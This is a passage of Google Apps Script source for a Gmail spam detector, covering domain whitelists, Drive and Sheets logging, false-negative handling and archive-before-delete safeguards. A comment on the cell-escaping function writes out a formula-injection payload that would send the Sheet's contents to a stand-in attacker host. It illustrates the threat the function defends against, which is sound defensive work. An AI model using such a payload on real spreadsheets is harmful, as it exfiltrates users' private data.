 * Deliberately a single line, at INFO, once per run: 1440/day is trivial for
 * Cloud Logging and cheap to query, where routing every logInfo there would not
 * be.
 *
 * @param {Object} stats - {processed, spam, errors, auditFindings}
 */
function logRunHeartbeat(stats)
{
  writeHealthRow(stats);

  const line = 'RUN v' + SCRIPT_VERSION +
               ' processed=' + stats.processed +
               ' spam='      + stats.spam +
               ' errors='    + stats.errors +
               ' audit='     + (stats.auditFindings > 0
                                 ? 'FINDINGS:' + stats.auditFindings : 'clean');
  Logger.log('[INFO] ' + line);
  try { console.log(line); }
  catch (e) { /* never break the run over a log line */ }
}


// =============================================================================
// Setup and Initialization
// =============================================================================

/**
 * One-time setup function — run manually to authorize the script and
 * initialize Script Properties with default domain lists.
 *
 * After running, set up a time-driven trigger:
 *   Triggers > Add Trigger > processInbox > Time-driven > Every 1 minute
 *
 * @throws {Error} If configuration validation or label creation fails.
 */
function setup()
{
  try
  {
    logInfo('Setting up spam detector...');

    // Validate configuration before proceeding
    validateConfig();

    // Create the "SpamChecked" label for tracking processed emails
    getOrCreateLabel(CONFIG.processedLabel);

    // Write default whitelist/blacklist to Script Properties (if not already set)
    initializeScriptProperties();

    logInfo('Setup complete! Now:');
    logInfo('  1. Run setupLogging() to enable spam intelligence logging (Drive + Sheets).');
    logInfo('  2. Set up a time-based trigger: Triggers > Add Trigger > processInbox > Time-driven > Every 1 minute');
  }
  catch (error)
  {
    logError('Setup failed: ' + error.toString());
    throw error;
  }
}

/**
 * Initialize Script Properties with default whitelist and blacklist.
 *
 * Only writes defaults if the properties don't exist yet — subsequent calls
 * are no-ops. This preserves any manual additions made via addToWhitelist()
 * or addToBlacklist() after initial setup.
 */
function initializeScriptProperties()
{
  const props = PropertiesService.getScriptProperties();

  // Initialize whitelist if not yet created
  if (!props.getProperty('LEGITIMATE_DOMAINS'))
  {
    const defaultWhitelist = Array.from(DEFAULT_DOMAINS.legitimate);
    props.setProperty('LEGITIMATE_DOMAINS', JSON.stringify(defaultWhitelist));
    logInfo('Initialized whitelist with ' + defaultWhitelist.length + ' domains');
  }

  // Initialize blacklist if not yet created
  if (!props.getProperty('SUSPICIOUS_DOMAINS'))
  {
    const defaultBlacklist = Array.from(DEFAULT_DOMAINS.suspicious);
    props.setProperty('SUSPICIOUS_DOMAINS', JSON.stringify(defaultBlacklist));
    logInfo('Initialized blacklist with ' + defaultBlacklist.length + ' domains');
  }
}


// =============================================================================
// Domain List Management (Whitelist / Blacklist)
//
// Runtime domain lists are stored in Script Properties (persistent key-value
// store). These functions provide CRUD operations for managing the lists
// without editing source code. Run them from the Apps Script editor.
// =============================================================================

/**
 * Get the effective whitelist: source-code defaults merged with any custom
 * domains the user has added via addToWhitelist().
 *
 * Why merge instead of reading Script Properties alone?
 *   Script Properties were initialized from DEFAULT_DOMAINS at setup() time.
 *   When DEFAULT_DOMAINS.legitimate is updated in source (e.g., a new whitelist
 *   entry is deployed), the old Script Properties snapshot doesn't update
 *   automatically — requiring a manual refreshWhitelist() call after every deploy.
 *
 *   By merging DEFAULT_DOMAINS.legitimate directly here, the source-code list
 *   is always live the moment clasp pushes the new code. Script Properties
 *   stores only the user-added custom entries; no post-deploy refresh needed.
 *
 * @return {Array<string>} DEFAULT_DOMAINS.legitimate ∪ user-added domains.
 */
function getWhitelist()
{
  // Always start with current source-code defaults (updated on every deploy)
  const list = Array.from(DEFAULT_DOMAINS.legitimate);

  const props = PropertiesService.getScriptProperties();
  const raw = props.getProperty('LEGITIMATE_DOMAINS');
  if (!raw) return list;

  try
  {
    const stored = JSON.parse(raw);
    // Merge any user-added custom domains not already in the defaults
    for (let i = 0; i < stored.length; i++)
    {
      if (!list.includes(stored[i])) list.push(stored[i]);
    }
    return list;
  }
  catch (e)
  {
    logError('Whitelist JSON corrupt — using defaults only: ' + e.toString());
    return list;
  }
}

/**
 * Get the effective blacklist: source-code defaults merged with any custom
 * domains the user has added via addToBlacklist().
 *
 * Same merge strategy as getWhitelist() — DEFAULT_DOMAINS.suspicious is always
 * the live source-code list; Script Properties holds only user-added extras.
 * No refreshBlacklist() call needed after deploy.
 *
 * @return {Array<string>} DEFAULT_DOMAINS.suspicious ∪ user-added domains.
 */
function getBlacklist()
{
  // Always start with current source-code defaults (updated on every deploy)
  const list = Array.from(DEFAULT_DOMAINS.suspicious);

  const props = PropertiesService.getScriptProperties();
  const raw = props.getProperty('SUSPICIOUS_DOMAINS');
  if (!raw) return list;

  try
  {
    const stored = JSON.parse(raw);
    // Merge any user-added custom domains not already in the defaults
    for (let i = 0; i < stored.length; i++)
    {
      if (!list.includes(stored[i])) list.push(stored[i]);
    }
    return list;
  }
  catch (e)
  {
    logError('Blacklist JSON corrupt — using defaults only: ' + e.toString());
    return list;
  }
}

/**
 * Cached wrapper for getWhitelist() — reads Script Properties once per execution.
 * Domain lists don't change mid-run; caching avoids redundant JSON.parse +
 * array-merge work when processing many emails per invocation.
 * @return {Array<string>}
 */
function getCachedWhitelist()
{
  if (_cachedWhitelist === null) _cachedWhitelist = getWhitelist();
  return _cachedWhitelist;
}

/**
 * Cached wrapper for getBlacklist() — reads Script Properties once per execution.
 * @return {Array<string>}
 */
function getCachedBlacklist()
{
  if (_cachedBlacklist === null) _cachedBlacklist = getBlacklist();
  return _cachedBlacklist;
}

/**
 * Add a domain to the whitelist (emails from this domain bypass detection).
 *
 * Duplicate-safe: silently skips if the domain is already in the list.
 *
 * @param {string} domain - Domain substring to whitelist (e.g., 'example.com').
 */
function addToWhitelist(domain)
{
  if (!domain || domain.trim().length === 0)
  {
    logError('addToWhitelist: domain must not be empty');
    return;
  }

  const props = PropertiesService.getScriptProperties();
  const whitelist = getWhitelist();

  if (!whitelist.includes(domain))
  {
    whitelist.push(domain);
    props.setProperty('LEGITIMATE_DOMAINS', JSON.stringify(whitelist));
    logInfo('Added to whitelist: ' + domain);
    logInfo('Whitelist now has ' + whitelist.length + ' domains');
  }
  else
  {
    logInfo('Domain already in whitelist: ' + domain);
  }
}

/**
 * Add a domain to the blacklist (triggers Rule 1 when combined with bulk email).
 *
 * Duplicate-safe: silently skips if the domain is already in the list.
 *
 * @param {string} domain - Domain substring to blacklist (e.g., 'spammer.com').
 */
function addToBlacklist(domain)
{
  if (!domain || domain.trim().length === 0)
  {
    logError('addToBlacklist: domain must not be empty');
    return;
  }

  const props = PropertiesService.getScriptProperties();
  const blacklist = getBlacklist();

  if (!blacklist.includes(domain))
  {
    blacklist.push(domain);
    props.setProperty('SUSPICIOUS_DOMAINS', JSON.stringify(blacklist));
    logInfo('Added to blacklist: ' + domain);
    logInfo('Blacklist now has ' + blacklist.length + ' domains');
  }
  else
  {
    logInfo('Domain already in blacklist: ' + domain);
  }
}

/**
 * Remove a domain from the whitelist.
 *
 * @param {string} domain - Domain substring to remove.
 */
function removeFromWhitelist(domain)
{
  const props = PropertiesService.getScriptProperties();
  const whitelist = getWhitelist();
  const index = whitelist.indexOf(domain);

  if (index > -1)
  {
    whitelist.splice(index, 1);
    props.setProperty('LEGITIMATE_DOMAINS', JSON.stringify(whitelist));
    logInfo('Removed from whitelist: ' + domain);
  }
  else
  {
    logInfo('Domain not found in whitelist: ' + domain);
  }
}

/**
 * Remove a domain from the blacklist.
 *
 * @param {string} domain - Domain substring to remove.
 */
function removeFromBlacklist(domain)
{
  const props = PropertiesService.getScriptProperties();
  const blacklist = getBlacklist();
  const index = blacklist.indexOf(domain);

  if (index > -1)
  {
    blacklist.splice(index, 1);
    props.setProperty('SUSPICIOUS_DOMAINS', JSON.stringify(blacklist));
    logInfo('Removed from blacklist: ' + domain);
  }
  else
  {
    logInfo('Domain not found in blacklist: ' + domain);
  }
}

/**
 * Print the current whitelist to the Apps Script log.
 * Run from the editor to inspect the list.
 */
function viewWhitelist()
{
  const whitelist = getWhitelist();
  logInfo('=== WHITELIST (' + whitelist.length + ' domains) ===');
  whitelist.forEach(function(domain) {
    logInfo('  - ' + domain);
  });
}

/**
 * Print the current blacklist to the Apps Script log.
 * Run from the editor to inspect the list.
 */
function viewBlacklist()
{
  const blacklist = getBlacklist();
  logInfo('=== BLACKLIST (' + blacklist.length + ' domains) ===');
  blacklist.forEach(function(domain) {
    logInfo('  - ' + domain);
  });
}

/**
 * refreshWhitelist() and refreshBlacklist() were removed in v6.47.0.
 *
 * They existed when Script Properties were the only source of the domain lists
 * and had to be re-seeded after a source edit. Since v6.35.0 getWhitelist() and
 * getBlacklist() merge DEFAULT_DOMAINS at runtime, so source edits are live as
 * soon as clasp pushes and there is nothing to refresh. Nothing called them for
 * twelve releases, and three separate comments already described them as
 * obsolete.
 */


// =============================================================================
// Spam Intelligence Logging
// =============================================================================

/**
 * Gmail label the user applies to spam emails the script missed.
 * On the next run, checkFalseNegatives() finds these, logs them, and deletes them.
 * @const {string}
 */
const SPAM_MISSED_LABEL = 'SpamMissed';

/**
 * In-memory buffer of log entries accumulated during a processInbox() run.
 * Populated by accumulateLogEntry(); drained by flushSpamLog() at end of run.
 * Re-initialized to [] on every Apps Script execution, which is the desired behavior.
 * @type {Array<Object>}
 */
let _pendingLogEntries = [];

/**
 * Run-scoped audit state. Reset at the top of every processInbox().
 *
 * These exist because every disposition bug this project has shipped was
 * invisible in production: the code believed it had acted, and the only way to
 * find out was for a human to open the Spam folder or the Sheet and notice. Six
 * messages sat through two releases meant to remove them; a whitelisted keep
 * was filed as a detection failure. Nothing alerted, and every test was green.
 *
 * So record what actually happened and compare it to what must be true.
 * See auditRunIntegrity().
 * @type {Array<string>}
 */
let _destroyedMessageIds = [];
/** @type {Array<string>} Message ids that reached the Sheet buffer this run. */
let _loggedMessageIds    = [];
/**
 * Aged Spam-folder threads phase 2 neither deleted nor deliberately spared.
 * Non-zero means the detector is NOT acting on the folder.
 * @type {number}
 */
let _unresolvedAgedSpam  = 0;

/**
 * Per-execution caches for domain lists. Populated on first access via
 * getCachedWhitelist() / getCachedBlacklist(); never mutated mid-run.
 * Apps Script re-initializes all module-level vars on each trigger invocation,
 * so no manual reset is needed between runs.
 * @type {Array<string>|null}
 */
let _cachedWhitelist = null;
let _cachedBlacklist = null;

/**
 * Message ids quarantined during this execution.
 *
 * destroySpam() removes these from any batch it is about to delete. Quarantine
 * no longer applies the SPAM label, so the sweeper should never encounter one —
 * but on 2026-09-16 it deleted a quarantined message because quarantine put it
 * in SPAM and relied on a search-index-dependent query to spare it. Excluding
 * by explicit id depends on no index and no query semantics.
 *
 * An earlier version of this guard was a single boolean that skipped the ENTIRE
 * sweep whenever anything had been quarantined. That turned the safety net off
 * for the whole execution, and combined with the re-quarantine loop it stayed
 * off indefinitely. Per-id exclusion keeps the sweep working.
 *
 * Module-level state resets on every Apps Script invocation — one execution,
 * which is the scope we want.
 */
let _quarantinedMessageIds = [];

/** Per-execution cache of label name -> REST API label id. See getLabelId(). */
let _labelIdCache = {};

/**
 * One-time setup for spam intelligence logging.
 *
 * Creates:
 *   - "Spam Intelligence/" folder at My Drive root
 *   - "Detected/" and "False Negatives/" subfolders inside it
 *   - "Spam Intelligence Log" spreadsheet with a "Raw Log" tab and column headers
 *   - "SpamMissed" Gmail label for flagging false negatives
 *
 * Saves the folder ID and spreadsheet ID to Script Properties so
 * flushSpamLog() can find them on every subsequent run. Run once manually
 * from the Apps Script editor after deploying this feature — the time-based
 * trigger will not prompt for the new OAuth scopes until this is called.
 *
 * @throws {Error} If Drive or Sheets creation fails.
 */
function setupLogging()
{
  try
  {
    logInfo('Setting up spam intelligence logging...');

    const props = PropertiesService.getScriptProperties();

    // ── Drive folder ─────────────────────────────────────────────────────────
    let rootFolder;
    const existingFolderId = props.getProperty('SPAM_LOG_FOLDER_ID');
    if (existingFolderId)
    {
      try { rootFolder = DriveApp.getFolderById(existingFolderId); }
      catch (e) { rootFolder = null; }
    }

    if (!rootFolder)
    {
      rootFolder = DriveApp.createFolder('Spam Intelligence');
      props.setProperty('SPAM_LOG_FOLDER_ID', rootFolder.getId());
      logInfo('Created "Spam Intelligence" folder in My Drive');
    }
    else
    {
      logInfo('Using existing "Spam Intelligence" folder');
    }

    getOrCreateLogSubfolder(rootFolder, ['Detected']);
    getOrCreateLogSubfolder(rootFolder, ['False Negatives']);

    // ── Spreadsheet ──────────────────────────────────────────────────────────
    let spreadsheet;
    const existingSheetId = props.getProperty('SPAM_LOG_SHEET_ID');
    if (existingSheetId)
    {
      try { spreadsheet = SpreadsheetApp.openById(existingSheetId); }
      catch (e) { spreadsheet = null; }
    }

    if (!spreadsheet)
    {
      spreadsheet = SpreadsheetApp.create('Spam Intelligence Log');
      props.setProperty('SPAM_LOG_SHEET_ID', spreadsheet.getId());

      const sheet = spreadsheet.getActiveSheet();
      sheet.setName('Raw Log');
      sheet.appendRow([
        'Detected At', 'Log Type', 'Gmail Message ID', 'Gmail Thread ID',
        'EML Drive URL', 'Subject', 'From Display Name', 'From Address',
        'Sending Domain', 'Reply-To', 'Rule Triggered', 'Rule Description',
        'Clickbait Count', 'Signals Detected', 'Bulk Email Service',
        'Has Attachment', 'List-Unsubscribe Present', 'False Negative Notes', 'Notes'
      ]);
      sheet.setFrozenRows(1);
      logInfo('Created "Spam Intelligence Log" spreadsheet');
    }
    else
    {
      logInfo('Using existing "Spam Intelligence Log" spreadsheet');
    }

    // ── SpamMissed label ─────────────────────────────────────────────────────
    getOrCreateLabel(SPAM_MISSED_LABEL);

    logInfo('Setup complete!');
    logInfo('Spreadsheet: ' + SpreadsheetApp.openById(props.getProperty('SPAM_LOG_SHEET_ID')).getUrl());
    logInfo('Drive folder: https://drive.google.com/drive/folders/' + rootFolder.getId());
    logInfo('Apply the "SpamMissed" label in Gmail to any spam the script misses.');
  }
  catch (error)
  {
    logError('setupLogging failed: ' + error.toString());
    throw error;
  }
}

/**
 * Run housekeeping tasks at most once every 5 minutes.
 *
 * At 1-minute trigger intervals, most invocations find no new emails.
 * Running checkFalseNegatives(), recheckRecentSpamChecked(), and destroySpam()
 * on every invocation would burn ~4 API calls/min (5,760/day) on work that
 * does not need per-minute granularity. This guard reduces that to 288
 * calls/day, and gates the expensive recheck separately (see below).
 *
 * Uses Script Properties to persist the last-run timestamp across executions.
 */
function runPeriodicMaintenance()
{
  // 5 minutes, down from 15. Chosen against Gmail's read quota rather than by
  // feel: recheckRecentSpamChecked() runs analyzeMessage() on up to 20 recent
  // inbox threads, and each non-whitelisted message costs a getRawContent()
  // fetch. At ~7 inbox threads that is ~7 reads per cycle:
  //     every 1 min -> ~10 000 reads/day  (about half the consumer daily quota)
  //     every 5 min ->  ~2 000 reads/day  (comfortable)
  // Running it every invocation would spend most of the daily quota
  // re-examining mail that has not changed, and quota exhaustion stops
  // detection altogether — the opposite of catching spam fast.
  //
  // Speed where it actually matters does not depend on this number:
  //   - NEW mail is scanned by processInbox()'s main loop every 1 minute.
  //   - A fix deploy re-checks recent mail IMMEDIATELY via the
  //     SCRIPT_VERSION change check below, not on this timer.
  // This interval only governs routine re-checks between deploys.
  const MAINTENANCE_INTERVAL_MS = 5 * 60 * 1000;
  const RECHECK_INTERVAL_MS     = 30 * 60 * 1000;
  const props  = PropertiesService.getScriptProperties();
  const lastTs = parseInt(props.getProperty('LAST_MAINTENANCE_TS') || '0', 10);

  // Force an immediate cycle when a new version has been deployed.
  //
  // A fix deploy exists precisely to catch something the previous code missed,
  // so making it wait up to 15 minutes to re-evaluate defeats the point.
  // Before v6.40.0, recheckRecentSpamChecked() ran on EVERY 1-minute
  // invocation, so a deploy re-caught its target within about a minute.
  // v6.40.0 moved maintenance behind the 15-minute gate for performance and
  // silently made post-deploy recatch up to 15x slower — a regression in the
  // v6.36.0 guarantee that a fix deploy cleans up after itself unattended.
  //
  // Comparing SCRIPT_VERSION against the last value seen restores that
  // guarantee without giving up the performance win: the forced run happens
  // once per deploy, not once per minute. It also covers deploys made outside
  // CI (a manual clasp push, or an edit in the Apps Script editor), which a
  // CI-side "run this function after deploying" step would miss.
  const seenVersion    = props.getProperty('LAST_SEEN_VERSION');
  const versionChanged = seenVersion !== SCRIPT_VERSION;

  if (!versionChanged && Date.now() - lastTs < MAINTENANCE_INTERVAL_MS) return;

  if (versionChanged)
  {
    logInfo('New version deployed (' + (seenVersion || 'none') + ' -> ' +
            SCRIPT_VERSION + ') — forcing immediate maintenance cycle');
    // Recorded BEFORE running the cycle, deliberately. If one of the
    // maintenance functions throws, the next 1-minute trigger must fall back
    // to the normal maintenance gate rather than force a fresh cycle every
    // minute and burn Gmail API quota.
    props.setProperty('LAST_SEEN_VERSION', SCRIPT_VERSION);
  }

  logInfo('Running periodic maintenance');

  // Cheap, and genuinely time-sensitive: one search each.
  checkFalseNegatives();
  destroySpam();

  // Re-judge Gmail's own spam verdicts and delete only what we agree about.
  // Runs after destroySpam() so our own failed deletes are retried first and
  // do not show up here as unreviewed.
  // versionChanged forces a full re-review, so a detection improvement is
  // applied to spam the previous logic already looked at and dismissed.
  reviewGmailSpam(versionChanged);

  // Expensive, and NOT time-sensitive. recheckRecentSpamChecked() re-evaluates
  // recent mail against the CURRENT patterns, so between deploys it keeps
  // computing the same answer at ~2 reads per message. Its real trigger is a
  // pattern change, which means a deploy.
  //
  // Run it when the version changed (immediately after a fix lands, which is
  // the case that matters), or on a slow timer so that a domain added at
  // runtime via addToBlacklist() — which changes behaviour without a deploy —
  // is still picked up within the hour.
  const lastRecheck = parseInt(props.getProperty('LAST_RECHECK_TS') || '0', 10);
  if (versionChanged || Date.now() - lastRecheck >= RECHECK_INTERVAL_MS)
  {
    recheckRecentSpamChecked();
    props.setProperty('LAST_RECHECK_TS', String(Date.now()));
  }

  props.setProperty('LAST_MAINTENANCE_TS', String(Date.now()));
}

/**
 * Scan for emails labeled "SpamMissed" by the user, log them, then delete them.
 *
 * The user labels an escaped spam email "SpamMissed" in Gmail. On the next run,
 * this function finds it, accumulates a log entry (Log Type = FALSE_NEGATIVE),
 * removes the label, then calls markAsSpam() to report and permanently delete
 * the email — identical path to auto-detected spam.
 *
 * collectSignals() is run on each false negative so the Sheets row captures WHY
 * the script missed it. The user fills in "False Negative Notes" manually later.
 */
function checkFalseNegatives()
{
  try
  {
    const threads = GmailApp.search('label:' + SPAM_MISSED_LABEL, 0, CONFIG.maxEmailsPerRun);
    if (threads.length === 0) return;

    logInfo('Found ' + threads.length + ' false negative(s) to log');

    const label = GmailApp.getUserLabelByName(SPAM_MISSED_LABEL);

    // Batch-fetch messages for all false-negative threads in one API call.
    const allMessages = GmailApp.getMessagesForThreads(threads);

    for (let i = 0; i < threads.length; i++)
    {
      try
      {
        const thread    = threads[i];
        const messages  = allMessages[i];
        if (!messages || messages.length === 0) continue;
        const message   = messages[0];

        // WHITELIST GUARD, checked before anything destructive.
        //
        // This path deletes on an explicit human instruction, and that argument
        // holds for one deliberate click. It does not hold for a mis-click on a
        // multi-select: applying SpamMissed to forty threads is two keystrokes
        // in Gmail, and until now every one of them was permanently deleted
        // with no whitelist check at all.
        //
        // A whitelisted sender is the user's own standing instruction that this
        // mail is wanted. Two instructions conflict, so the safe resolution is
        // the non-destructive one: refuse, say why, and let the user resolve it
        // deliberately — either by deleting in Gmail (one click, recoverable
        // via Trash) or by removing the domain from the whitelist.
        // Checked across EVERY message in the thread, not just messages[0].
        // markAsSpam()'s fallback when the Advanced Gmail Service is missing is
        // thread.moveToSpam(), which moves the whole thread — so a whitelisted
        // sibling in a reply chain would be dragged along. getFrom() is free
        // metadata, so scanning the thread costs nothing.
        const whitelistedInThread = messages.some(function(m) {
          return isWhitelistedSender(m);
        });

        if (whitelistedInThread)
        {
          accumulateLogEntry(message, null, 'SPAM_MISSED_REFUSED_WHITELISTED',
                             { skipArchive: true });
          swapSpamMissedForReview(thread, label,
            'REFUSED: SpamMissed on a WHITELISTED sender: ' +
            sanitizeForLog(message.getSubject()) +
            '. Remove the domain from the whitelist first, or delete it in Gmail ' +
            'directly.');
          continue;
        }

        let signals = null;
        try { signals = collectSignals(message); }
        catch (e) { /* non-fatal — log entry still captured without signals */ }

        // Accumulate BEFORE deletion — getRawContent() is unavailable after batchDelete
        const archived = accumulateLogEntry(message, signals, 'FALSE_NEGATIVE');

        // The archive invariant applies here too: an explicit instruction to
        // delete is not an instruction to delete the only copy.
        //
        // Checked BEFORE the label is removed. Previously the label came off
        // first, so this branch dropped the message silently and the comment
        // claiming it "will retry next run" was false — nothing carried the
        // label any more, so nothing ever retried.
        if (!archived)
        {
          // Swapped, not kept. Keeping the label looked like a free retry, but
          // accumulateLogEntry() above buffers its Sheets row BEFORE this check,
          // so every retry wrote a duplicate row and paid two getRawContent()
          // fetches: measured at 288 rows and 576 reads per day per stuck
          // message, with no convergence. An unreachable Drive is a persistent
          // configuration fault, not a transient one, so retrying forever is
          // strictly worse than stopping and saying so.
          swapSpamMissedForReview(thread, label,
            'REFUSED: cannot archive, so not deleting: ' +
            sanitizeForLog(message.getSubject()) +
            '. Run setupLogging(), then re-apply SpamMissed.');
          continue;
        }

        // Remove label before markAsSpam() — deleted threads can't have labels removed
        if (label) thread.removeLabel(label);

        // Deliberately markAsSpam(), NOT disposeDetectedMessage(): the user
        // asked for destruction and this is not a whitelisted sender.
        markAsSpam(message, thread);

        logInfo('FALSE NEGATIVE LOGGED AND DESTROYED: ' + sanitizeForLog(message.getSubject()));
      }
      catch (threadError)
      {
        logError('Error processing false negative: ' + threadError.toString());
      }
    }
  }
  catch (error)
  {
    logError('checkFalseNegatives failed: ' + error.toString());
  }
}

/**
 * Re-evaluate recently SpamChecked inbox emails against the current patterns.
 *
 * Problem this solves: when a false negative is detected and patterns are
 * improved, emails that were already stamped SpamChecked (processed before the
 * fix deployed) are permanently excluded from the normal scan. They sit in the
 * inbox until the user notices and manually labels them SpamMissed.
 *
 * This function closes that gap automatically. It runs on a new deploy via
 * runPeriodicMaintenance(), re-checking inbox emails carrying SpamChecked from
 * the last RECHECK_DAYS days. Any that now score as spam under updated patterns
 * are logged as FALSE_NEGATIVE, archived out of the inbox, and HELD under
 * CONFIG.reviewLabel.
 *
 * This path does NOT delete, and deliberately does not get the same treatment
 * as a manually labelled SpamMissed email. The difference is consent: a
 * SpamMissed label is the user asking for destruction, whereas this is the
 * script overruling a decision the user already made, using a pattern deployed
 * moments ago. See holdForReview() for the full reasoning.
 *
 * Performance: capped at RECHECK_LIMIT emails per run. Messages are batch-fetched
 * via getMessagesForThreads() (one API call for all threads). analyzeMessage()
 * averages ~2ms per email in GAS, so 20 emails adds ~40ms — negligible vs. budget.
 */
function recheckRecentSpamChecked()
{
  const RECHECK_DAYS  = 2;
  const RECHECK_LIMIT = 20;

  try
  {
    const query   = 'in:inbox label:' + CONFIG.processedLabel +
                    ' -label:' + CONFIG.phishingLabel +
                    ' newer_than:' + RECHECK_DAYS + 'd';
    const threads = GmailApp.search(query, 0, RECHECK_LIMIT);
    if (threads.length === 0) return;

    logDebug('Rechecking ' + threads.length + ' recent SpamChecked inbox email(s)');

    // Batch-fetch messages for all recheck threads in one API call.
    const allMessages = GmailApp.getMessagesForThreads(threads);
    let recaughtCount = 0;

    for (let i = 0; i < threads.length; i++)
    {
      try
      {
        const thread   = threads[i];
        const messages = allMessages[i];
        if (!messages || messages.length === 0) continue;
        const message  = messages[0];

        const verdict = analyzeMessage(message);
        if (!verdict.isSpam) continue;

        logInfo('Auto-recaught false negative: ' + sanitizeForLog(message.getSubject()));

        // Archive the evidence, then HOLD — never delete on this path.
        //
        // Until v6.48.0 this called disposeDetectedMessage(), so a newly
        // deployed pattern permanently deleted up to 20 messages the user had
        // already read and kept, within a minute of the deploy, with nothing
        // between the new regex and the loss but a 22-file ham corpus. It was
        // the highest-blast-radius consequence of a bad pattern in the system
        // and the one most likely to be exercised, because a pattern is added
        // precisely when it is new and unproven.
        accumulateLogEntry(message, verdict.signals, 'FALSE_NEGATIVE');
        holdForReview(message, thread, 'recheck after pattern change');
        recaughtCount++;
      }
      catch (threadError)
      {
        logError('recheckRecentSpamChecked thread error: ' + threadError.toString());
      }
    }

    if (recaughtCount > 0)
    {
      logInfo('Recheck: held ' + recaughtCount + ' newly-matching email(s) from the last ' +
              RECHECK_DAYS + ' days for review under the "' + CONFIG.reviewLabel +
              '" label — none were deleted');
    }
  }
  catch (error)
  {
    logError('recheckRecentSpamChecked failed: ' + error.toString());
  }
}

/**
 * Capture a spam event into the in-memory log buffer.
 *
 * Must be called BEFORE markAsSpam() — getRawContent() is unavailable after
 * the message is permanently deleted via batchDelete(). The raw MIME content
 * is held in memory until flushSpamLog() writes it to Drive at end of run.
 *
 * Non-blocking: any error is caught and logged; the caller's deletion flow
 * is unaffected if this function fails.
 *
 * @param {GmailMessage} message - The spam message to capture.
 * @param {Object|null}  signals - Signal object from collectSignals(), or null.
 * @param {string}       logType - 'SPAM_DETECTED', 'PHISHING_DETECTED', or 'FALSE_NEGATIVE'.
 */
/**
 * Make an attacker-controlled value safe to hand to Range.setValues().
 *
 * setValues() EVALUATES formulas — this code relies on that for the
 * =HYPERLINK() in the Drive URL column. So a Subject, display name, address or
 * Reply-To beginning with '=', '+', '-', '@', tab or CR becomes a LIVE FORMULA
 * in the user's own authenticated Sheets session. A subject of
 *   =IMPORTXML("https://attacker/?x="&ENCODEURL(JOIN(",",A2:R500)),"//a")
 * fires on document open with no interaction and exfiltrates the entire
 * detection log — every sender, subject, message id and Drive EML URL.
 * The attacker fully controls whether their own mail is flagged, so getting
 * the row written is trivial.
 *
 * Prefixing an apostrophe forces Sheets to treat the cell as literal text.
 * Also length-capped: a subject exceeding the 50 000-character cell limit made
 * setValues() throw, and because flushSpamLog()'s finally clears the buffer,
 * one crafted subject destroyed the log rows for every message in that batch —
 * all of which were already deleted.
 *
 * @param {*} value - Raw, attacker-influenced value.
 * @return {string} A value that cannot be interpreted as a formula.
 */
function escapeSheetCell(value)
{
  if (value === null || value === undefined) return '';

  let text = String(value);
  if (text.length > LIMITS.maxSheetCellChars)
  {
    text = text.substring(0, LIMITS.maxSheetCellChars) + '...[truncated]';
  }

  return /^[=+\-@\t\r]/.test(text) ? "'" + text : text;
}

function accumulateLogEntry(message, signals, logType, options)
{
  // rawContent: supplied by the caller when it already has it, so the message
  // is not fetched twice. collectSignals() pulls getRawContent() for bulk
  // detection, and this function pulled it again — two fetches per message on
  // the delete path, measured.
  // skipArchive: log the Sheets row but do NOT copy the raw message to Drive.
  //
  // Used for messages we are logging but NOT deleting. The Drive EML exists
  // purely as a recovery copy for mail about to be destroyed; a message that
  // survives needs no copy, and archiving it would put legitimate mail (a
  // whitelisted sender Gmail misfiled) into Drive for no benefit. Also skips
  // the getRawContent() fetch entirely, saving a Gmail read.
  const skipArchive = !!(options && options.skipArchive);
  try
  {
    const from            = sanitizeInput(message.getFrom()).replace(RFC2822_QUOTED_NAME, '$1$2');
    const emailAddress    = extractEmailAddress(from);
    const fromDisplayName = from.replace(/<[^>]*>$/, '').trim();

    const domainMatch  = emailAddress.match(/@(.+)$/);
    const sendingDomain = domainMatch ? domainMatch[1] : emailAddress;

    let hasAttachment = false;
    try { hasAttachment = message.getAttachments().length > 0; }
    catch (e) { /* non-fatal */ }

    let listUnsubscribePresent = false;
    try { listUnsubscribePresent = message.getHeader('List-Unsubscribe').length > 0; }
    catch (e) { /* non-fatal */ }

    let rawContent = '';
    if (!skipArchive)
    {
      try { rawContent = message.getRawContent(); }
      catch (e) { logError('getRawContent failed for ' + message.getId() + ': ' + e.toString()); }
    }

    // Write the EML to Drive NOW, synchronously, before the caller disposes of
    // the message.
    //
    // This used to only buffer, with the Drive write happening in
    // flushSpamLog() after the whole thread loop — so the real order was
    // batchDelete THEN Drive write, and the "archived before deleting"
    // guarantee that the v6.44.0 post-mortem relied on did not exist. Anything
    // ending the execution in between lost the archive permanently, and
    // flushSpamLog()'s finally clears the buffer so there was no carry-over:
    // a 6-minute timeout, an unset SPAM_LOG_FOLDER_ID, a memory kill, or a
    // throw from runPeriodicMaintenance() each deleted mail with no copy.
    //
    // The returned value is the invariant disposeDetectedMessage() enforces:
    // no archive, no permanent delete.
    const archive = skipArchive
      ? { archived: false, driveUrl: '' }
      : archiveRawEml(message.getId(), rawContent, logType);

    // rawContent is deliberately NOT stored on the buffered entry. Once
    // archiveRawEml() has written it to Drive nothing reads it again, and
    // keeping it meant holding up to CONFIG.maxEmailsPerRun full raw messages
    // in memory until the flush — 50 x up to 25MB, since getRawContent() is
    // not bounded by CONFIG.maxEmailSizeBytes (that check reads getBody()).
    // An Apps Script memory kill there used to lose every buffered archive for
    // messages already deleted; now the archives are already on disk, and the
    // buffer holds only the small Sheets row.

    _loggedMessageIds.push(message.getId());

    _pendingLogEntries.push({
      driveUrl:               archive.driveUrl,
      archived:               archive.archived,
      detectedAt:             new Date().toISOString(),
      logType:                logType,
      messageId:              message.getId(),
      threadId:               message.getThread().getId(),
      subject:                message.getSubject() || '',
      fromDisplayName:        fromDisplayName,
      fromAddress:            emailAddress,
      sendingDomain:          sendingDomain,
      replyTo:                message.getReplyTo() || '',
      ruleInfo:               getRuleFromSignals(signals),
      clickbaitCount:         signals ? signals.clickbaitCount : 0,
      signalsCsv:             buildSignalsCsv(signals),
      bulkEmailService:       signals ? signals.bulkEmailService : false,
      hasAttachment:          hasAttachment,
      listUnsubscribePresent: listUnsubscribePresent
    });

    return archive.archived;
  }
  catch (error)
  {
    logError('accumulateLogEntry failed: ' + error.toString());
    return false;
  }
}

/**
 * Write one raw message to the Drive archive immediately.
 *
 * Split out of flushSpamLog() so the archive can be written BEFORE disposal
 * rather than after. Only the Sheets row remains batched — that is where the
 * batching win actually is, and a lost Sheets row is recoverable from the EML
 * whereas a lost EML is not recoverable from anything.
 *
 * @param {string} messageId  - Gmail message id, used for the filename.
 * @param {string} rawContent - Full RFC822 content.
 * @param {string} logType    - Routes FALSE_NEGATIVE to its own subfolder.
